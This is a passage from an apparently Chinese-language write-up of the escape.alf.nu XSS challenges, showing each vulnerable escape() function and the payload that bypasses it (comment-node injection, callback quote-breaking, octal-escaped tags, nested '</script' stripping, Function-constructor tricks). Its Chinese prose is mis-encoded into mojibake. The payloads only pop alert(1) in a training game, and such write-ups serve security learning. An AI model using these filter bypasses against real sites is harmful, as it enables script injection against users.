class="line">  <span class="keyword">var</span> text = s.replace(<span class="regexp">/&lt;/g</span>, <span class="string">'&amp;lt;'</span>).replace(<span class="regexp">/"/g</span>, <span class="string">'&amp;quot;'</span>);</span><br><span class="line">  <span class="comment">// URLs</span></span><br><span class="line">  text = text.replace(<span class="regexp">/(http:\/\/\S+)/g</span>, <span class="string">'&lt;a href="$1"&gt;$1&lt;/a&gt;'</span>);</span><br><span class="line">  <span class="comment">// [[img123|Description]]</span></span><br><span class="line">  text = text.replace(<span class="regexp">/\[\[(\w+)\|(.+?)\]\]/g</span>, <span class="string">'&lt;img alt="$2" src="$1.gif"&gt;'</span>);</span><br><span class="line">  <span class="keyword">return</span> text;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆåˆ†æè¿™é¢˜çš„å¤„ç†æ–¹æ³•</p><ol><li>é¦–å…ˆï¼Œå¯¹äºä»»ä½•è¾“å…¥ï¼Œå…ˆè¿‡æ»¤æ‰<code>&lt;</code>å’Œ<code>&quot;</code>å˜ä¸ºå®ä½“ç¼–ç <code>&amp;lt</code>å’Œ<code>&amp;quot</code>ã€‚</li><li>å¦‚æœå­—ç¬¦ä¸²ä¸­æœ‰åŒ…å«<code>http://</code>å¼€å¤´çš„å­—ç¬¦ä¸²ï¼Œä¾‹å¦‚<code>http://xiao.world</code>åˆ™å˜ä¸º<code>&lt;a href=&quot;http://xiao.world&quot;&gt;http://xiao.world&lt;/a&gt;</code></li><li>å¦‚æœå­—ç¬¦ä¸²ä¸­åŒ…å«<code>[[img_src|img_alt]]</code>æ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œåˆ™å˜ä¸º<code>&lt;img alt=&quot;img_alt&quot; src=&quot;this_src.git&quot;&gt;</code></li><li>è¿”å›å­—ç¬¦ä¸²</li></ol><p>å¯¹äºè¿™ä¸ªé¢˜ç›®ï¼Œå› ä¸ºå°–æ‹¬å·å’Œå¼•å·éƒ½è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥è¦ä»è¿™é‡Œå…¥æ‰‹ä¼šæ¯”è¾ƒå›°éš¾ã€‚ä½†æ˜¯å¯ä»¥åˆ©ç”¨ç¬¬äºŒç‚¹å’Œç¬¬ä¸‰ç‚¹çš„è§„åˆ™æ¥åšçªç ´å£ã€‚ä¸ºç”šä¹ˆè¿™ä¹ˆè¯´å‘¢ï¼Ÿæ—¢ç„¶è‡ªå·±æ²¡åŠæ³•é—­åˆå±æ€§çš„å¼•å·æˆ–è€…æ ‡ç­¾ï¼Œä½†æ˜¯è§„åˆ™äºŒè½¬æ¢ä¹‹åä¼šå¸¦æœ‰å¼•å·ï¼Œåˆ©ç”¨è¿™ä¸ªå¼•å·ï¼Œå°±å¯ä»¥é—­åˆæ‰è§„åˆ™ä¸‰è½¬æ¢ä¹‹åçš„imgæ ‡ç­¾çš„altå±æ€§äº†ã€‚<br>è¾“å…¥ï¼š<code>[[a|http://onerror=&#39;alert(1)]]</code><br>ç»è¿‡è§„åˆ™ä¸€è½¬æ¢å:<code>[[a|&lt;a href=&quot;http://onerror=&#39;alert(1)&#39;]]&quot;&gt;http://onerror=&#39;alert(1)&#39;]]&lt;/a&gt;</code><br>å†ç»è¿‡è§„åˆ™äºŒè½¬æ¢ï¼š <code>&lt;img alt=&quot;&lt;a href=&quot;http://onerror=&#39;alert(1)&#39;&quot; src=&quot;a.gif&quot;&gt;&quot;&gt;http://onerror=&#39;alert(1)&#39;]]&lt;/a&gt;</code><br>æ„Ÿè°¢HTMLè¯­è¨€æ¾æ•£çš„ç‰¹æ€§ï¼Œä»¥ä¸Šå³ç›¸å½“äº: <code>&lt;img alt=&quot;&lt;a href=&quot; http:=&quot;&quot; onerror=&quot;alert(1)&quot; &quot;=&quot;&quot; src=&quot;a.gif&quot;&gt;</code><br>å†ç²¾ç®€ä¸€ç‚¹ï¼Œåªçœ‹å…³é”®éƒ¨åˆ†: <code>&lt;img alt=&quot;&lt;a href=&quot; onerror=&quot;alert(1)&quot; src=&quot;a.git&quot;&gt;</code><br>è‡³æ­¤ï¼Œå¤§åŠŸå‘ŠæˆğŸ˜„ã€‚<br>solution(31 chars): <code>[[a|http://onerror=&#39;alert(1)&#39;]]</code><br><br><br><br><br></p><h1 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// Slightly too lazy to make two input fields.</span></span><br><span class="line">  <span class="comment">// Pass in something like "TextNode#foo"</span></span><br><span class="line">  <span class="keyword">var</span> m = s.split(<span class="regexp">/#/</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Only slightly contrived at this point.</span></span><br><span class="line">  <span class="keyword">var</span> a = <span class="built_in">document</span>.createElement(<span class="string">'div'</span>);</span><br><span class="line">  a.appendChild(<span class="built_in">document</span>[<span class="string">'create'</span>+m[<span class="number">0</span>]].apply(<span class="built_in">document</span>, m.slice(<span class="number">1</span>)));</span><br><span class="line">  <span class="keyword">return</span> a.innerHTML;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…³é”®åœ¨äºç†è§£ç¬¬å…«è¡Œçš„ä»£ç ã€‚<br>å¦‚æœè¾“å…¥ä¸º<code>Element#alert</code><br>ç¬¬å…«è¡Œä¸ºï¼š<code>document[&quot;createElement&quot;].apply(document, &quot;alert&quot;)</code><br>ç›¸å½“äº<code>document.createElement(&quot;alert&quot;)</code><br>è¿™æ ·åªæ˜¯åˆ›å»ºäº†ä¸€ä¸ª<code>&lt;alert&gt;</code>æ ‡ç­¾ï¼Œæˆ‘ä»¬æ²¡æœ‰åŠæ³•æ³¨å…¥ã€‚æ‰€ä»¥æŸ¥ä¸€ä¸‹documentæœ‰å“ªäº›createå¼€å¤´çš„æ–¹æ³•ï¼Œä¸€ä¸‹åˆ—å‡ºä¸€äº›å¸¸ç”¨çš„ï¼š</p><blockquote><p>createElement<br>createTextNode<br>createComment<br>createAttribute<br>createEvent</p></blockquote><p>è¿™é‡Œçœ‹åˆ°æœ‰<code>createComment</code>å°±ä»¤äººç‰¹åˆ«å¼€å¿ƒã€‚æ‰€ä»¥ç­”æ¡ˆè§ä¸‹<br>solution(32 chars): <code>Comment#&gt;&lt;iframe onload=alert(1)</code><br><br><br><br><br></p><h1 id="Callback"><a href="#Callback" class="headerlink" title="Callback"></a>Callback</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// Pass inn "callback#userdata"</span></span><br><span class="line">  <span class="keyword">var</span> thing = s.split(<span class="regexp">/#/</span>); </span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="regexp">/^[a-zA-Z\[\]']*$/</span>.test(thing[<span class="number">0</span>])) <span class="keyword">return</span> <span class="string">'Invalid callback'</span>;</span><br><span class="line">  <span class="keyword">var</span> obj = &#123;<span class="string">'userdata'</span>: thing[<span class="number">1</span>] &#125;;</span><br><span class="line">  <span class="keyword">var</span> json = <span class="built_in">JSON</span>.stringify(obj).replace(<span class="regexp">/&lt;/g</span>, <span class="string">'\\u003c'</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="string">"&lt;script&gt;"</span> + thing[<span class="number">0</span>] + <span class="string">"("</span> + json +<span class="string">")&lt;/script&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éšä¾¿è¾“å…¥ç‚¹çœ‹çœ‹æ•ˆæœå§ï¼š<code>input1#input2</code><br>è¾“å‡º: <code>&lt;script&gt;input1({&quot;userdata&quot;:&quot;input2&quot;})&lt;/script&gt;</code><br>å› ä¸ºinput1æœ‰è¾“å…¥è¦æ±‚ï¼Œä½†æ˜¯input2å¯ä»¥ä¸ºä»»æ„å€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„æ³¨å…¥å¯ä»¥æ”¾åœ¨input2ï¼Œä½†æ˜¯åœ¨input2ä¹‹å‰æœ‰ä¸€å †å¥‡å¥‡æ€ªæ€ªçš„ä¸œè¥¿ï¼Œæœ€ç›´æ¥ç®€å•çš„åŠæ³•å°±æ˜¯ç”¨å¼•å·é—­åˆæ‰ä»–ä»¬å°±å¥½äº†ã€‚æ‰€å¹¸input1å¹¶æ²¡æœ‰æŠŠå•å¼•å·è¿‡æ»¤æ‰ï¼Œæ‰€ä»¥ç­”æ¡ˆå°±æ˜¯<br>solution(15 chars): <code>&#39;#&#39;;alert(1);//</code><br><br><br><br><br></p><h1 id="Skandia"><a href="#Skandia" class="headerlink" title="Skandia"></a>Skandia</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log("'</span> + s.toUpperCase() + <span class="string">'")&lt;/script&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¢˜ç›®çœŸçŸ­ï¼Œä½†å¿ƒæ€æ²¡å°‘èŠ±å‘€ã€‚<br>jsçš„æ–¹æ³•åæ˜¯å¤§å°å†™æ•æ„Ÿçš„ï¼Œå¦‚æœæŠŠ<code>alert</code>å˜ä¸ºäº†<code>ALERT</code>ï¼Œé‚£å°±ä¸è¡Œäº†ã€‚ä½†æ˜¯HTMLæ ‡ç­¾åå’Œå±æ€§åæ˜¯ä¸åŒºåˆ†å¤§å°å†™çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é—­åˆæ‰<code>&lt;script&gt;</code>æ ‡ç­¾ï¼Œç„¶åè‡ªå·±æ³¨å…¥æ ‡ç­¾ï¼Œåˆ©ç”¨<code>onload</code>å±æ€§å‡ºå‘<code>alert</code>ï¼Œä½†æ˜¯æœ‰ä¸ªé—®é¢˜å°±æ˜¯<code>alert</code>å¤§å°å†™æ€ä¹ˆåŠå‘¢ï¼Ÿä¾æˆ‘ä¸ªäººæµ‹è¯•å’Œç†è§£(æš‚æ—¶æœªæ‰¾åˆ°æ ¹æ®)ï¼Œåœ¨å±æ€§å€¼å¤„ä½¿ç”¨å®ä½“ç¼–ç çš„è¯ï¼Œæ˜¯å¯ä»¥è‡ªåŠ¨è§£ç çš„,å…¶ä»–åœ°æ–¹åˆ™ä¸è¡Œã€‚æ‰€ä»¥ï¼Œé—®é¢˜è§£å†³äº†ã€‚<br>solution(53 chars): <code>&lt;/script&gt;&lt;iframe onload=&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74(1)&gt;</code><br>ä½†æˆ‘è¿™ä¸ªè§£ç”¨äº†53ä¸ªå­—ç¬¦ï¼Œå¹¶ä¸æ˜¯æœ€çŸ­çš„ï¼Œä½†æ˜¯æœ‰äººä¹Ÿæœ‰äººåšåˆ°äº†30å¤šå’Œ40å¤šçš„ï¼Œæˆ‘æš‚æ—¶ä¹Ÿæƒ³ä¸åˆ°ä»€ä¹ˆåŠæ³•ã€‚æœ‰çŸ¥é“çš„è¯·å‘Šè¯‰æˆ‘ä¸€å£°ï¼Œè°¢è°¢ğŸ˜„<br><br><br><br><br></p><h1 id="Template"><a href="#Template" class="headerlink" title="Template"></a>Template</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">htmlEscape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> s.replace(<span class="regexp">/./g</span>, <span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> &#123; <span class="string">'&lt;'</span>: <span class="string">'&amp;lt;'</span>, <span class="string">'&gt;'</span>: <span class="string">'&amp;gt;'</span>, <span class="string">'&amp;'</span>: <span class="string">'&amp;amp;'</span>, <span class="string">'"'</span>: <span class="string">'&amp;quot;'</span>, <span class="string">"'"</span>: <span class="string">'&amp;#39;'</span> &#125;[x] || x;       </span><br><span class="line">     &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">expandTemplate</span>(<span class="params">template, args</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> template.replace(</span><br><span class="line">        /&#123;(\w+)&#125;/g, </span><br><span class="line">        <span class="function"><span class="keyword">function</span>(<span class="params">_, n</span>) </span>&#123; </span><br><span class="line">           <span class="keyword">return</span> htmlEscape(args[n]);</span><br><span class="line">         &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> expandTemplate(</span><br><span class="line">    <span class="string">"                                                \n\</span></span><br><span class="line"><span class="string">      &lt;h2&gt;Hello, &lt;span id=name&gt;&lt;/span&gt;!&lt;/h2&gt;         \n\</span></span><br><span class="line"><span class="string">      &lt;script&gt;                                       \n\</span></span><br><span class="line"><span class="string">         var v = document.getElementById('name');    \n\</span></span><br><span class="line"><span class="string">         v.innerHTML = '&lt;a href=#&gt;&#123;name&#125;&lt;/a&gt;';       \n\</span></span><br><span class="line"><span class="string">      &lt;\/script&gt;                                     \n\</span></span><br><span class="line"><span class="string">    "</span>,</span><br><span class="line">    &#123; <span class="attr">name</span> : s &#125;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç®€å•æ¥è¯´ï¼Œå¯¹è¾“å…¥å­—ç¬¦ä¸²è¿‡æ»¤æ‰å°–æ‹¬å·ï¼Œå¼•å·ç­‰ï¼Œç„¶åå°†å¤„ç†å®Œçš„å­—ç¬¦ä¸²æ›¿æ¢æ‰æ¨¡æ¿å­—ç¬¦ä¸²ä¸­<code>{name}</code>ã€‚ä½†æ˜¯ç™¾å¯†ä¸€ç–ï¼Œå­—ç¬¦ä¸²ä¸­å¯ä»¥ç”¨8è¿›åˆ¶æˆ–è€…16è¿›åˆ¶æ¥è¡¨ç¤ºå­—ç¬¦ã€‚æ‰€ä»¥ç­”æ¡ˆå°±å‡ºæ¥äº†ã€‚<code>&lt;</code>å¯¹åº”çš„å…«è¿›åˆ¶æ˜¯<code>\74</code>ã€‚<br>solution(27): <code>\74iframe onload=alert(1)//</code><br><br><br><br><br></p><h1 id="JSON-1"><a href="#JSON-1" class="headerlink" title="JSON ]["></a>JSON ][</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  s = <span class="built_in">JSON</span>.stringify(s).replace(<span class="regexp">/&lt;\/script/gi</span>, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log('</span> + s + <span class="string">');&lt;/script&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜ä¹ŸæŒºæœ‰æ„æ€çš„ã€‚æ ¼å¼åŒ–ä¹‹åå†æŠŠ<code>&lt;/script</code>æ›¿æ¢æˆç©ºä¸²ã€‚ä½¿ç”¨ä¸€ç‚¹æŠ€å·§å°±å¯ä»¥ç»•è¿‡äº†ã€‚<br>solution(35): <code>&lt;/scr&lt;/scriptipt&gt;&lt;script&gt;alert(1)//</code><br><br><br><br><br></p><h1 id="Callback-1"><a href="#Callback-1" class="headerlink" title="Callback ]["></a>Callback ][</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// Pass inn "callback#userdata"</span></span><br><span class="line">  <span class="keyword">var</span> thing = s.split(<span class="regexp">/#/</span>); </span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="regexp">/^[a-zA-Z\[\]']*$/</span>.test(thing[<span class="number">0</span>])) <span class="keyword">return</span> <span class="string">'Invalid callback'</span>;</span><br><span class="line">  <span class="keyword">var</span> obj = &#123;<span class="string">'userdata'</span>: thing[<span class="number">1</span>] &#125;;</span><br><span class="line">  <span class="keyword">var</span> json = <span class="built_in">JSON</span>.stringify(obj).replace(<span class="regexp">/\//g</span>, <span class="string">'\\/'</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="string">"&lt;script&gt;"</span> + thing[<span class="number">0</span>] + <span class="string">"("</span> + json +<span class="string">")&lt;/script&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å’Œä¸Šé¢çš„é¢˜ç›®<a href="#Callback">Callback</a>ä¸€æ ·ï¼Œåªæ˜¯å› ä¸ºè¿‡æ»¤äº†<code>/</code>ï¼Œä¸èƒ½ç”¨<code>//</code>æ³¨é‡Šäº†è€Œå·²ï¼Œé‚£å°±æ¢ä¸€ç§æ³¨é‡Šæ–¹å¼å§<br>solution(16): <code>&#39;#&#39;;alert(1)&lt;!--</code><br><br><br><br><br></p><h1 id="Skandia-1"><a href="#Skandia-1" class="headerlink" title="Skandia ]["></a>Skandia ][</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  if (/[&lt;&gt;]/.test(s)) return &apos;-&apos;;</span><br><span class="line"></span><br><span class="line">  return &apos;&lt;script&gt;console.log(&quot;&apos; + s.toUpperCase() + &apos;&quot;)&lt;/script&gt;&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆè€ƒè™‘åˆ°å¯ä»¥é—­åˆ<code>script</code>æ ‡ç­¾ï¼Œä½†æ˜¯è¿™é¢˜è¿‡æ»¤äº†å°–æ‹¬å·ï¼Œæƒ³åˆ°ä¸Šä¸€é¢˜<a href="#Template">Template</a>çš„æ–¹æ³•ï¼Œå³ç”¨åå…­è¿›åˆ¶æˆ–å…«è¿›åˆ¶æ¥è¡¨ç¤ºå°–æ‹¬å·ï¼Œä½†æ˜¯ç»è¿‡æµ‹è¯•å‘ç°ï¼Œåœ¨è¿™é¢˜å¹¶ä¸ç®¡ç”¨ã€‚æƒ³ä¸æ˜ç™½ä¸ºç”šä¹ˆï¼Œä½†æ˜¯æµ‹è¯•ç»“æœæ˜¯ï¼šå­—ç¬¦ä¸²çš„<code>replace</code>æ–¹æ³•æ˜¯è®¤ä¸å‡ºåå…­è¿›æˆ–è€…å…«è¿›åˆ¶ä»£è¡¨çš„å­—ç¬¦çš„ï¼Œä½†æ˜¯<code>test</code>æ–¹æ³•å´å¯ä»¥ã€‚æ‰€ä»¥ä¸Šä¸€é¢˜Templateç”¨çš„è¿‡æ»¤æ–¹æ³•replaceè¿‡æ»¤<code>&lt;</code>æ‹¬å·æ—¶ï¼Œç”±äºæˆ‘ä»¬ç”¨äº†<code>\74</code>æ¥è¡¨ç¤ºï¼Œè€Œreplaceæ–¹æ³•å¹¶ä¸è®¤è¯†å®ƒï¼Œæ‰€ä»¥ç»•è¿‡äº†è¿‡æ»¤ã€‚ä½†æ˜¯è¿™é¢˜ç”¨äº†<code>test</code>æ–¹æ³•ï¼Œé¢å¯¹åŒæ ·çš„æƒ…å†µï¼Œå®ƒçŸ¥é“<code>\74</code>å³ä»£è¡¨ç€<code>&lt;</code>ï¼Œæ‰€ä»¥è¿™ä¸ªæ–¹æ³•æ— æ•ˆäº†ã€‚<br>æ—¢ç„¶ä¸èƒ½é—­åˆ<code>script</code>ï¼Œé‚£å°±å¯ä»¥è€ƒè™‘é—­åˆ<code>log</code>ï¼Œåº”è¯¥æ³¨å…¥çš„payloadæ˜¯<code>&quot;);alert(1)//</code>ï¼Œä½†æ˜¯alertè½¬ä¸ºå¤§å†™å°±ä¸è¡Œäº†ã€‚æ­¤æ—¶æœ€ç®€å•ç²—æš´çš„æ–¹æ³•æ˜¯ç›´æ¥ç”¨<a href="http://utf-8.jp/public/jjencode.html" target="_blank" rel="noopener">jjencode</a>( an online non-alphanumeric encoder)ã€‚å°†<code>alert(1)</code>ç”¨jjencode encodeå¾—åˆ°çš„è½¬ç åçš„ç»“æœï¼Œç”±äºç»“æœå¤ªé•¿äº†ï¼Œæ‰€ä»¥ç”¨jjencodeä»£è¡¨ï¼Œåˆ™<br>solutioon(538)ä¸º: <code>&quot;);jjencode//</code></p><p>ä½†æ˜¯538ä¸ªå­—ç¬¦è¿˜æ˜¯å¤ªé•¿äº†ã€‚åœ¨<a href="http://www.pwntester.com/blog/2014/01/08/escape-alf-nu-xss-challenges-write-ups-part-257/" target="_blank" rel="noopener">pwntester</a>çš„åšå®¢é‡Œçœ‹åˆ°äº†ä¸€ä¸ªæ›´å¥½çš„åŠæ³•ã€‚<br>é¦–å…ˆåº”è¯¥æ³¨å…¥çš„payloadæ˜¯<code>&quot;+alert(1))//&quot;</code><br>ä½†æ˜¯è¦æƒ³åŠæ³•ç”¨ç›¸ç­‰æ•ˆæœçš„è¯­å¥æ›¿æ¢æ‰alert(1)ã€‚<br>åœ¨åšå®¢ä¸Šçœ‹åˆ°ä¸€ä¸ªæ–¹æ³•ä¹Ÿå¯ä»¥è§¦å‘alert(1)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[][<span class="string">"sort"</span>][<span class="string">"constructor"</span>](<span class="string">"alert(1)"</span>)()</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå…³é”®åœ¨äº<code>Function(&quot;code&quot;)</code>ã€‚å®ƒå¯ä»¥å°†å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ä¼ è¿›å»ï¼Œè¿”å›ä¸€ä¸ªä»¥ä¼ è¿›å»çš„å­—ç¬¦ä¸²ä¸ºå‡½æ•°ä½“çš„åŒ¿åå‡½æ•°ã€‚æ‰€ä»¥è¿™ä¸ªå‡½æ•°å¯ä»¥è®©ä½ å°†å­—ç¬¦ä¸²å½“ä½œä»£ç æ¥æ‰§è¡Œã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>[][&#39;sort&#39;][&#39;constructor&#39;]</code>æ¥è·å¾—è¿™ä¸ªå‡½æ•°ã€‚<br><img src="/image/3.png" alt><br>é¡ºä¾¿ç®€å•è¯´ä¸€ä¸‹ï¼Œ<code>[]</code>å®šä¹‰äº†ä¸€ä¸ªç©ºæ•°ç»„ï¼Œæ•°ç»„è‡ªå¸¦äº†å¾ˆå¤šæ–¹æ³•ï¼Œ<code>sort</code>æ˜¯å…¶ä¸­ä¸€ä¸ªï¼Œè¿˜æœ‰å¾ˆå¤šæ–¹æ³•ï¼Œéšä¾¿ç”¨ä¸€ä¸ªéƒ½è¡Œï¼Œè¿™é‡Œå°±ç”¨äº†sortã€‚<code>[][&quot;sort&quot;]</code>çš„æ•ˆæœç›¸å½“äº<code>[].sort</code>ã€‚<br>æ‰€æœ‰payloadå¯ä»¥æ”¹ä¸º<code>&quot;+[][&quot;sort&quot;][&quot;constructor&quot;](&quot;alert(1)&quot;)())+&quot;</code><br>æ­¤æ—¶åˆå¤šäº†ä¸€ä¸ªæ–°çš„é—®é¢˜ï¼Œç”¨ä»€ä¹ˆæ¥ä»£æ›¿ä¸Šé¢çš„ä¸‰ä¸ªå­—ç¬¦ä¸²å‘¢ï¼Ÿ<br>è¿™æ—¶å€™å°±å¯ä»¥ç”¨é¢˜ç›®Templateä¸­ç”¨åˆ°çš„æ–¹æ³•äº†ï¼Œç”¨å…«è¿›åˆ¶æ¥ä»£æ›¿å­—æ¯ã€‚<br>æ‰€ä»¥ç­”æ¡ˆå°±å‡ºæ¥äº†ï¼š<br>solution(99): <code>&quot;+[][&quot;\160\157\160&quot;][&quot;\143\157\156\163\164\162\165\143\164\157\162&quot;](&#39;\141\154\145\162\164(1)&#39;)()+&quot;</code>  </p><p><br><br><br><br></p><h1 id="iframe"><a href="#iframe" class="headerlink" title="iframe"></a>iframe</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> tag = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// For this one, you get to run any code you want, but in a "sandboxed" iframe.</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// https://4i.am/?...raw=... just outputs whatever you pass in.</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Alerting from 4i.am won't count.</span></span><br><span class="line"></span><br><span class="line">  s = <span class="string">'&lt;script&gt;'</span> + s + <span class="string">'&lt;\/script&gt;'</span>;</span><br><span class="line">  tag.src = <span class="string">'https://4i.am/?:XSS=0&amp;CT=text/html&amp;raw='</span> + <span class="built_in">encodeURIComponent</span>(s);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">window</span>.WINNING = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; youWon = <span class="literal">true</span>; &#125;;</span><br><span class="line"></span><br><span class="line">  tag.setAttribute(<span class="string">'onload'</span>, <span class="string">'youWon &amp;&amp; alert(1)'</span>);</span><br><span class="line">  <span class="keyword">return</span> tag.outerHTML;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é¢˜å…¶å®ä¹ŸæŒºå¥½ç©çš„ï¼Œå¦‚æœæ¯”è¾ƒç†Ÿæ‚‰iframeçš„ç‰¹æ€§çš„è¯ï¼Œå…¶å®ä¹Ÿå¾ˆç®€å•å¾ˆå¿«å°±åšå‡ºæ¥äº†ï¼Œä½†æ˜¯å¦‚æœä¸çŸ¥é“çš„è¯ï¼Œé‚£å°±æŒºèŠ±æ—¶é—´çš„äº†ã€‚<br>è¿™é¢˜å…³é”®åœ¨äºä½¿å¾—<code>youWon</code>è¿™ä¸ªå˜é‡çš„å€¼ä¸ºtrueï¼Œç„¶åå°±å¯ä»¥è§¦å‘alert(1)äº†ã€‚é¦–å…ˆçœ‹ä¸€ä¸‹æˆ‘ä»¬æ³¨å…¥çš„åœ°æ–¹æ˜¯ä¸€ä¸ªURLï¼Œé¢˜ç›®æœ‰è¯´ï¼Œè¿™ä¸ªurlé¡µé¢è¿”å›çš„é¡µé¢å°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„å†…å®¹ã€‚ä¹Ÿå°±æ˜¯è¯´iframeçš„å†…å®¹æ˜¯ç”±æˆ‘ä»¬å†³å®šçš„ã€‚<br>æˆ‘ä»¬çš„è¾“å…¥ä¼šåŒ…è£¹åœ¨ä¸€ä¸ª<code>script</code>æ ‡ç­¾é‡Œé¢ã€‚<br>è¦åšå‡ºè¿™é“é¢˜ï¼Œæˆ‘ä»¬è¦çŸ¥é“ä¸¤ç‚¹iframeçš„ç‰¹æ€§</p><ol><li>iframeçš„nameå±æ€§å€¼ï¼ŒåŒæ—¶ä¼šæ³¨å…¥åˆ°çˆ¶é¡µé¢çš„å…¨å±€çª—å£å¯¹è±¡ä¸­ã€‚</li><li>iframeçš„nameå±æ€§ï¼Œåˆ™iframeçš„window.nameçš„å€¼åŒæ—¶ä¼šè®¾ç½®ä¸ºè¿™ä¸ªnameå±æ€§å€¼ã€‚åè¿‡æ¥ä¹Ÿæ˜¯ä¸€æ 